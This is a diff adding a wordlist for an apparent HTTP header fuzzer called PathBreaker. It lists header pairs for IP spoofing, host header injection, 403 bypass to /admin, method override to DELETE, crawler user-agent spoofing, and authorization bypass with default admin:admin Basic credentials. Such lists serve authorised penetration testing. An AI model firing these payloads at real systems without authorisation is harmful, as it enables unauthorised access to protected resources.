@@ -1,0 +1,89 @@
+# PathBreaker – Built-in Header Pairs Wordlist
+# Each line is a full "Header-Name: value" pair injected into the request.
+# Used by the Header Fuzzer in Header Pairs mode, or as values in Single Header mode.
+# Lines starting with # are ignored.
+
+# ── IP Spoofing / Bypass ─────────────────────────────────────────────────────
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 10.0.0.2
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: 192.168.0.1
+X-Forwarded-For: 192.168.1.1
+X-Forwarded-For: ::1
+
+X-Real-IP: 127.0.0.1
+X-Real-IP: localhost
+X-Real-IP: 10.0.0.1
+
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: 10.0.0.1
+
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+X-Azure-ClientIP: 127.0.0.1
+
+# ── Host Header Injection ─────────────────────────────────────────────────────
+X-Host: localhost
+X-Forwarded-Host: localhost
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Server: localhost
+X-Forwarded-Server: 127.0.0.1
+
+# ── Path / URL Override (403 bypass) ─────────────────────────────────────────
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Override-URL: /admin
+X-Original-URL: /
+X-Rewrite-URL: /
+X-Custom-Override: /admin
+
+# ── Protocol / Scheme ─────────────────────────────────────────────────────────
+X-Forwarded-Proto: https
+X-Forwarded-Proto: http
+X-Forwarded-Scheme: https
+
+# ── Via / Proxy ───────────────────────────────────────────────────────────────
+Via: 1.1 localhost
+Via: 1.0 localhost
+Forwarded: for=127.0.0.1
+
+# ── User-Agent (Bot / Crawler bypass) ────────────────────────────────────────
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+User-Agent: curl/7.79.1
+
+# ── Referer (access control bypass) ─────────────────────────────────────────
+Referer: https://trusted.example.com/
+Referer: http://localhost/
+Referer: https://accounts.google.com/
+
+# ── Content-Type (injection) ──────────────────────────────────────────────────
+Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded
+Content-Type: text/xml
+
+# ── Cache Poisoning / Unkeyed headers ────────────────────────────────────────
+X-Cache-Key: pathbreaker
+X-HTTP-Method-Override: GET
+X-HTTP-Method-Override: POST
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method: DELETE
+X-Method-Override: PUT
+
+# ── Authorization bypass ──────────────────────────────────────────────────────
+Authorization: Basic YWRtaW46YWRtaW4=
+Authorization: Bearer test
+X-Auth-Token: test
+X-Api-Key: test
+X-API-Key: admin
